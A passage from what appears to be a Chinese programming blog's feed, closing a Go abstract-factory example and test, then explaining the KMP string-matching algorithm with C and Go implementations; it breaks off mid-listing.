CreateChair() Chair &#123;</span><br><span class="line">    <span class="keyword">return</span> ModernChair&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f ModernFurnitureFactory)</span></span> CreateTable() Table &#123;</span><br><span class="line">    <span class="keyword">return</span> ModernTable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f ModernFurnitureFactory)</span></span> CreateSofa() Sofa &#123;</span><br><span class="line">    <span class="keyword">return</span> ModernSofa&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************</span></span><br><span class="line"><span class="comment"> * Concrete products and concrete factory of concise furniture</span></span><br><span class="line"><span class="comment"> ******************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ConciseChair <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c ConciseChair)</span></span> Sit() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Sitting on concise chair&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ConciseTable <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t ConciseTable)</span></span> PutDown() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Putting down concise table&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ConciseSofa <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s ConciseSofa)</span></span> Sit() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Sitting on concise sofa&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ConciseFurnitureFactory <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f ConciseFurnitureFactory)</span></span> CreateChair() Chair &#123;</span><br><span class="line">    <span class="keyword">return</span> ConciseChair&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f ConciseFurnitureFactory)</span></span> CreateTable() Table &#123;</span><br><span class="line">    <span class="keyword">return</span> ConciseTable&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f ConciseFurnitureFactory)</span></span> CreateSofa() Sofa &#123;</span><br><span class="line">    <span class="keyword">return</span> ConciseSofa&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************</span></span><br><span class="line"><span class="comment"> * GetFactory will choose the concrete factory</span></span><br><span class="line"><span class="comment"> ******************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// GetFactory will choose the concrete factory</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetFactory</span><span class="params">(furnitureType <span class="type">string</span>)</span></span> FurnitureFactory &#123;</span><br><span class="line">    <span class="keyword">switch</span> furnitureType &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;modern&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> ModernFurnitureFactory&#123;&#125;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;concise&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> ConciseFurnitureFactory&#123;&#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> factory  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;testing&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestAbstractFactory</span><span class="params">(t *testing.T)</span></span> &#123;  </span><br><span class="line">    <span class="keyword">type</span> Unit <span class="keyword">struct</span> &#123;  </span><br><span class="line">       name <span class="type">string</span>  </span><br><span class="line">       want []<span class="keyword">interface</span>&#123;&#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    tests := []Unit&#123;  </span><br><span class="line">       &#123;  </span><br><span class="line">          name: <span class="string">&quot;modern&quot;</span>,  </span><br><span class="line">          want: []<span class="keyword">interface</span>&#123;&#125;&#123;ModernChair&#123;&#125;, ModernSofa&#123;&#125;, ModernTable&#123;&#125;&#125;,  </span><br><span class="line">       &#125;,  </span><br><span class="line">       &#123;  </span><br><span class="line">          name: <span class="string">&quot;concise&quot;</span>,  </span><br><span class="line">          want: []<span class="keyword">interface</span>&#123;&#125;&#123;ConciseChair&#123;&#125;, ConciseSofa&#123;&#125;, ConciseTable&#123;&#125;&#125;,  </span><br><span class="line">       &#125;,  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">for</span> _, tt := <span class="keyword">range</span> tests &#123;  </span><br><span class="line">       factory := GetFactory(tt.name)  </span><br><span class="line">       got := []<span class="keyword">interface</span>&#123;&#125;&#123;  </span><br><span class="line">          factory.CreateChair(),  </span><br><span class="line">          factory.CreateSofa(),  </span><br><span class="line">          factory.CreateTable(),  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="keyword">for</span> i, v := <span class="keyword">range</span> got &#123;  </span><br><span class="line">          <span class="keyword">if</span> v != tt.want[i] &#123;  </span><br><span class="line">             t.Errorf(<span class="string">&quot;%s got %T, want %T&quot;</span>, tt.name, v, tt.want[i])  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KMP算法</title>
      <link href="/20240c88ef1578e9/"/>
      <url>/20240c88ef1578e9/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p>字符串匹配算法需要维护2个指针,分别为指向主串的<code>i</code>和指向模式串的<code>j</code>.<br>设主串的长度为<code>n</code>, 模式串的长度为<code>m</code>.</p><h2 id="暴力匹配低效的原因">暴力匹配低效的原因</h2><p>单纯的暴力匹配需要对指针进行回溯:</p><ul><li>对于主串的指针<code>i</code>, 从某一个起始点<code>k</code>开始匹配, 如果匹配失败则从<code>k+1</code>处重头开始匹配</li><li>对于子串的指针<code>j</code>, 一旦上一次匹配失败, 那么这一次重新的匹配就需要重新归零, 即从模式串的开始重头开始匹配<br>这样的回溯导致暴力匹配的时间复杂度为<code>O(n*m)</code>, 非常低效.</li></ul><h2 id="kmp尝试改进的思路">KMP尝试改进的思路</h2><p>与暴力相比, KMP试图尝试利用已经搜索过的<code>主串信息</code>. 先不管模式串, 因为模式串是固定的, 对于主串, 我们至少要将整个主串扫描一遍, 这需要<code>O(n)</code>, 然而暴力方法在回溯<code>i</code>的过程中, 有着大量的字符被不止一次地重复扫描, 这是其效率低下的一个重要原因; 而另一个原因是, 每次重新匹配都需要让<code>j</code>归零, 但实际上很多情况下, 前面的部分根本不需要重新匹配, 因为扫描过的主串靠后面的位置很有可能与模式串前面相同.</p><p>改进的思路之一为: 尝试以某种方式将之前已经扫描过的主串信息&quot;记录&quot;下来, 让<code>i</code>无需再次回溯, 换言之, <code>i</code>指针永不回头.</p><p>而改进的思路之二为: 在思路一中, 我们想让<code>i</code>无需回溯, 并且以某种方式(暂时不关心如何记录)记录下来了这种信息, 这些信息中必然包含了&quot;主串中某些位置是和模式串的某些位置是匹配的&quot;这一信息, 尝试提取出它们, 就可以让<code>j</code>指针无需每次重头开始匹配, 而是直接从一个合适的&quot;中间位置&quot;开始进行下一次匹配即可.</p><h2 id="观察一个例子">观察一个例子</h2><p>下面这个例子匹配了一部分, 此时发生了失败, 但是观察到有一些有趣的事情:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240524022314.png" alt="image|725"><br>容易想到, 既然这样, 那么下一次匹配就可以直接忽略模式串中&quot;ab&quot;这个前缀, 直接从模式串的&quot;e&quot;开始继续比较即可, 也就是:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240524023040.png" alt="image.png|725"><br>所以问题转化为: “从模式串当前匹配成功的部分中找到某一段前缀, 让其和主串匹配成功部分的末尾一段匹配”, 即上上图中主串和模式串开头虚线相连的&quot;ab&quot;:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240524023538.png" alt="image.png|500"></p><p>但是主串内容是不可控的, 并且我们期望指针<code>i</code>永不回溯, 因此该问题中的主串末尾那部分就需要设法以另一种方式获取到. 显然, 它就是&quot;模式串当前匹配成功的部分中对应的后缀&quot;:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240524023635.png" alt="image.png|500"><br>因此, 问题再次转化为: “找到当前模式串匹配成功的部分中, 最长的公共前后缀”:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240524023934.png" alt="image.png|500"><br>之所以是&quot;最长&quot;的, 是因为如果所找的公共前后缀如果不是最长的, 那么就可能会跳过(忽略)主串中间本来可以正确匹配到的部分, 导致匹配失败, 这里可以自行举一个例子尝试一下.</p><p>因此, 我们问题转化为&quot;求解一个字符串(即模式串)所有从下标0开头的子串的最长公共前后缀&quot;</p><h1 id="求解最长公共前后缀">求解最长公共前后缀</h1><p>我们实际的问题其实和求解最长公共前后缀有所出入, 但问题不大—我们要求的是公共前后缀中,前缀后一个字符的下标, 当然, 只要求出该公共前后缀, 求解这个下标便轻而易举.</p><h2 id="普通解法的思路">普通解法的思路</h2><p>例如上一节的例子中, 我们最终使用的就是前缀&quot;ab&quot;的后一个字符&quot;e&quot;的下标, 将<code>j</code>指针移动到该处.</p><p>我们使用<code>next[]</code>数组来存储这些值, 其中<code>next[i]</code>表示模式串<code>s</code>的子串<code>s[0,i]</code>(包括边界)的公共前后缀中, 前缀的后一个字符的下标(其实恰好就是这个前缀的长度).</p><p>如何求解这个数组? 很容易想到, 枚举下标<code>i</code>, 对每一个子串<code>s[0,i]</code>, 分别尝试以不同的前缀长度去匹配, 如果该长度的前后缀相同, 则更新. 但是这样效率极其低下.</p><p><code>KMP</code>利用动态规划的思想进行递推求解<code>next[]</code>数组. 例如下面这个串的next数组为:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240528105317.png" alt="image.png|475"><br>例如<code>next[5]</code>为2, 表示对应的子串&quot;abacab&quot;的最长公共前后缀为&quot;ab&quot;, 其长度为2.</p><p>现在考虑如何优化. 看下面这个例子, 假设前面的<code>next[]</code>元素已经通过某种方式求解完成, 现在要求解最后一个元素:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240528105731.png" alt="image.png|475"><br>为了方便起见, 我们为图中模式串标注下标. 我们需要求解<code>next[7]</code>, 即需要找到下图中若干红框和蓝框要相等的部分, 选出其中最长的一个:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240528110405.png" alt="image.png|475"><br>不考虑优化的话, 我们大可以从大到小逐个暴力遍历这些红框和蓝框, 一一对应地检查, 直到找到一个匹配的部分, 由于是从大到小, 所以这个部分的长度就是要求的<code>next[7]</code>值. 结果显然是2(“ab”).</p><h2 id="动态规划优化的思路">动态规划优化的思路</h2><p>现在尝试优化. 先来观察一下这个&quot;ab&quot;所处的位置:<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240528110933.png" alt="image.png|475"><br>如上图, 我们可以获得如下信息:</p><ol><li>最终的结果<code>next[7]</code>为黄横线所对应的2个前后缀.</li><li>根据前面的结果<code>next[6]=3</code>(这里假设他们通过某种方式求解得出, 这里在反推优化方式)得到, 图中2个蓝框对应的前后缀相同.</li><li>根据前面的结果<code>next[2]=1</code>得到, 图中2个实线绿框相同.</li><li>因为<code>next[6]=3</code>, 所以<code>next[2]</code>对应的子串&quot;aba&quot;(这个子串的长度对应<code>next[6]</code>的值)实际上就是<code>next[6]=3</code>对应的那个前缀部分. 根据next的定义, 图中蓝框相同, 并且实线绿框相同, 因此可以推得: 图中实线绿框和虚线绿框相同.</li></ol><p><strong>注：这里的<code>next[2]</code>就是<code>next[next[6]-1]</code>，减1是出于本文对next数组的定义，如果修改一下next数组的定义（见后文）则无需减1！</strong><br><br></p><p>我们尝试根据这些信息来求解<code>next[7]</code>(当然, 这里是从信息推结果, 反过来理解, 从结果来找出这些信息的规律也是可以的):</p><ol><li><p>首先, 由于<code>s[0,6]</code>的最长公共前后缀为<code>next[6]=3</code>, 所以我们复用这个信息, 即在&quot;aba&quot;子串的基础上&quot;尝试&quot;加上后面一个字符, 分别是<code>s[3]='c'</code>和<code>s[7]='b'</code>, 显然&quot;abac&quot;和&quot;abab&quot;并不相同, 匹配失败.</p></li><li><p>考虑到公共前后缀均从开头和末尾开始, 我们需要重新分配前后缀的起始位置(串的左边界), 但是发现, 无论如何, 结果一定是这样的: “找出<code>s[0,6]</code>中的某个公共前后缀m和n, 让前缀m加上后面一个字符, n加上后面一个字符(即<code>s[7]='b'</code>), 这样的相同的2个部分”.</p></li><li><p>显然, 步骤2中需要的 “<code>s[0,6]</code>中的某个公共前后缀m和n” 就是<code>next[0,6]</code>的职责所在, 而他早已被求出!</p></li><li><p>而另一个很关键的问题是, 如果步骤2匹配失败, 例如图中的蓝框, 那么我们发现图中实线绿框和虚线绿框是相同的,而实线绿框就是&quot;<code>next[6]=3</code>所包含的前缀<code>s[0,2]</code>对应的<code>next[2]</code>前后缀&quot;!</p></li><li><p>我们为其重新着色, 如下图, 原来的问题&quot;匹配下图红框和绿框的扩展&quot;就<strong>转移为</strong>&quot;匹配下图红框和橙框的扩展&quot;, 当然,其中的橙框作为后缀, 其扩展是要连接上<code>s[7]='b'</code>而不是其后面的<code>s[3]</code>! (为了方便观察, 将扩展字符用黑框标识)</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240528114523.png" alt="image.png|475"><br><br></p></li><li><p>再次回到我们的问题, 如果如步骤3所述, 在步骤2中匹配失败, 那么下一步匹配就直接去<code>next[6]</code>对应的前缀<code>s[0,2]</code>中查找. 换句话说: 我们每次比较的子串只需要<strong>更新为</strong>根据当前匹配失败的<code>next</code>数组元素所指向的前缀即可, 而不是像之前暴力那样仅仅递减1去缩短长度! 如果用步骤5的图来表示的话, 那就是相当于将焦点从蓝框直接转移到紫框即可.</p></li></ol><p>总结一下, 上面过程最关键的一个前提就是, 使用了一个<code>等价代换</code>, 即将绿框等价地代换为橙框!</p><h2 id="最终的求解流程">最终的求解流程</h2><p>求解<code>next[n]</code>的步骤如下:</p><ol><li>设<code>k=next[n-1]</code></li><li>如果<code>k==-1</code>, 则查找失败, 则<code>next[n]=0</code>, 求解结束; 否则跳转到步骤3.</li><li>比较<code>s[n]==s[k]</code>, 如果成立, 则<code>next[n]=k+1</code>, 求解结束; 否则跳转到步骤4.</li><li>更新<code>k=next[k-1]</code>, 跳转到步骤2继续迭代.</li></ol><p>此外需要注意的一点是, 有的实现是将<code>next[i]</code>定义为&quot;模式串<code>s</code>的子串<code>s[0,i-1]</code>(包括边界)的公共前后缀中, 前缀的后一个字符的下标(或称公共前后缀的长度)&quot;<br>这时候需要注意一下k的初始值和更新, 不再是<code>next[k-1]</code>, 而是<code>next[k]</code>.<br>笔者在写这篇文章的时候是按照<code>s[0,i]</code>的定义, 后来才发现和大部分实现有出入, 不过其实无伤大雅, 只需要在求解和使用<code>next</code>的时候注意一下下标即可.</p><p>此外为了落实到代码, 本文的这种实现要将第一个元素设为<code>0</code>, 具体原因详见代码注释.</p><h1 id="kmp简单的实现代码">KMP简单的实现代码</h1><p>使用C和Golang两种语言实现, 并附加有另一种next定义的实现(更加优雅简洁).</p><h2 id="本文的实现方法">本文的实现方法</h2><p>C语言:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LEN 100  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// 本实现的`next[i]`定义为&quot;模式串`s`的子串`s[0,i]`(包括边界)的公共前后缀中, 前缀的后一个字符的下标(或称公共前后缀的长度)&quot;,  </span></span><br><span class="line"><span class="comment">// 这并不是最优雅的实现, 然而只需要简单地修改定义便可以进一步简化实现  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_next</span><span class="params">(<span class="type">char</span> *pattern, <span class="type">int</span> *next)</span> &#123;  </span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>;  </span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;  </span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="built_in">strlen</span>(pattern)) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (pattern[i] == pattern[j]) &#123;  </span><br><span class="line">            next[i++] = ++j; <span class="comment">// 之所以存储j+1的原因是，j是下标，从0开始，而next数组的每一个元素都存储的是一个实际的串（某个前缀串）的长度，因此要+1  </span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="number">0</span>) &#123;  </span><br><span class="line">            next[i++] = <span class="number">0</span>;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            j = next[j - <span class="number">1</span>]; <span class="comment">// 因为这里是next[j-1], 因此需要额外判断j是否为0, 进而本实现需要将next[0]设置为0  </span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">kmp</span><span class="params">(<span class="type">char</span> *text, <span class="type">char</span> *pattern, <span class="type">int</span> *idxs)</span> &#123;  </span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, len = <span class="number">0</span>;  </span><br><span class="line">    <span class="type">int</span> *next = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="built_in">strlen</span>(pattern));  </span><br><span class="line">    <span class="type">size_t</span> pattern_len = <span class="built_in">strlen</span>(pattern);  </span><br><span class="line">    get_next(pattern, next);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="built_in">strlen</span>(text)) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (text[i] == pattern[j]) &#123;  </span><br><span class="line">            i++;  </span><br><span class="line">            j++;  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j != <span class="number">0</span>) &#123;  </span><br><span class="line">            j = next[j - <span class="number">1</span>];  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            i++;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (j == pattern_len) &#123;  </span><br><span class="line">            idxs[len++] = i - j;  </span><br><span class="line">            j = next[j - <span class="number">1</span>]; <span class="comment">// 注意: 这里需要回退到next[j - 1], 因为不同的匹配部分可能会重叠  </span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">char</span> text[MAX_LEN];  </span><br><span class="line">    <span class="type">char</span> pattern[MAX_LEN];  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// init  </span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, text);  </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, pattern);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// search  </span></span><br><span class="line">    <span class="type">int</span> idx[MAX_LEN];  </span><br><span class="line">    <span class="type">int</span> len = kmp(text, pattern, idx);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// output  </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, idx[i]);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：<br>关于该版本代码中对于KMP原理的体现问题：<br>当发生了前后两个字符不匹配的时候 此时j需要根据<code>next[i-1]</code>的值向前跳转（从原理上需要获知<code>next[i-1]</code>的值）<br>然而由于正常情况下 <code>i</code> 和 <code>j</code>同时增长，因此这个值已经隐含在<code>j</code>中了，因此直接<code>j=next[j-1]</code>即可</p><p>Golang:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 本实现的`next[i]`定义为&quot;模式串`s`的子串`s[0,i]`(包括边界)的公共前后缀中, 前缀的后一个字符的下标(或称公共前后缀的长度)&quot;,  </span></span><br><span class="line"><span class="comment">// 这并不是最优雅的实现, 然而只需要简单地修改定义便可以进一步简化实现  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getNext</span><span class="params">(pattern <span class="type">string</span>)</span></span> (next []<span class="type">int</span>) &#123;  </span><br><span class="line">    i, j := <span class="number">1</span>, <span class="number">0</span>  </span><br><span class="line">    next = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="built_in">len</span>(pattern))  </span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">for</span> i &lt; <span class="built_in">len</span>(pattern) &#123;  </span><br><span class="line">       <span class="keyword">if</span> pattern[i] == pattern[j] &#123;  </span><br><span class="line">          j++  </span><br><span class="line">          next[i] = j  </span><br><span class="line">          i++  </span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> j == <span class="number">0</span> &#123;  </span><br><span class="line">          next[i] = <span class="number">0</span>  </span><br><span class="line">          i++  </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">          j = next[j<span class="number">-1</span>] <span class="comment">// 因为这里是next[j-1], 因此需要额外判断j是否为0, 进而本实现需要将next[0]设置为0  </span></span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">kmp</span><span class="params">(text, pattern <span class="type">string</span>)</span></span> (res []<span class="type">int</span>) &#123;  </span><br><span class="line">    i, j := <span class="number">0</span>, <span class="number">0</span>  </span><br><span class="line">    next := getNext(pattern)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> i &lt; <span class="built_in">len</span>(text) &#123;  </span><br><span class="line">       <span class="keyword">if</span> text[i] == pattern[j] &#123;  </span><br><span class="line">          i++  </span><br><span class="line">          j++  </span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> j != <span class="number">0</span> &#123;  </span><br><span class="line">          j = next[j<span class="number">-1</span>]  </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">          i++  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="keyword">if</span> j == <span class="built_in">len</span>(pattern) &#123;  </span><br><span class="line">          res = <span class="built_in">append</span>(res, i-j)  </span><br><span class="line">          j = next[j<span class="number">-1</span>] <span class="comment">// // 注意: 这里需要回退到next[j - 1], 因为不同的匹配部分可能会重叠  </span></span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    <span class="keyword">var</span> text, pattern <span class="type">string</span>  </span><br><span class="line">    _, _ = fmt.Scanln(&amp;text)  </span><br><span class="line">    _, _ = fmt.Scanln(&amp;pattern)  </span><br><span class="line">  </span><br><span class="line">    idx := kmp(text, pattern)  </span><br><span class="line">    <span class="keyword">for</span> i, v := <span class="keyword">range</span> idx &#123;  </span><br><span class="line">       <span class="keyword">if</span> i != <span class="number">0</span> &#123;  </span><br><span class="line">          fmt.Print(<span class="string">&quot; &quot;</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">       fmt.Print(v)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="优化的实现方法">优化的实现方法</h2><p>该实现需要修改<code>next[]</code>的定义为: “模式串<code>s</code>的子串<code>s[0,i-1]</code>(包括边界)的公共前后缀中, 前缀的后一个字符的下标(或称公共前后缀的长度)”</p><p>C语言:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 